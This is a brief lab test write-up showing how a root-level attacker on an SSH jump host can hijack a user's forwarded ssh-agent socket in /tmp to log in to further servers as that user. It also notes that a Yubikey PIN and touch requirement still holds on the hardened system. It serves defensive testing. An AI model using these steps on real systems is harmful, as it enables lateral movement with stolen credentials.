# assume the attacker has already compromised the remote host and elevated privileges

BASE SYSTEM (Linux-Base)

as larry:
1. eval `ssh-agent` 
2. ssh-add ./.ssh/id_rsa
the agent now has access to the key, it creates a tmp file that is a socket to the agent
3. ssh Linux-Base-Jump -A
this will forward the agent with the ssh connection to the remote computer

------------------------------------------------------------------------------------
REMOTE SYSTEM (Linux-Base-Jump)
------------------------------------------------------------------------------------
as ansible su to root:
1. ls /tmp | grep ssh
2. export SSH_AUTH_SOCK=/tmp/ssh-XXXXXXXXX/agent.YYY (replace the X and Y with the actual numbers)
3. ssh larry@Linux-Base-Server.sshlab -v

Notice that an elevated attacker on a remote host now has access to any machines the user's key can authenticate to because the user forwarded the agent.

*this test is the same on the hardened system as test 3, the forwarded agent still requires unlocking the Yubikey with pin and touch.
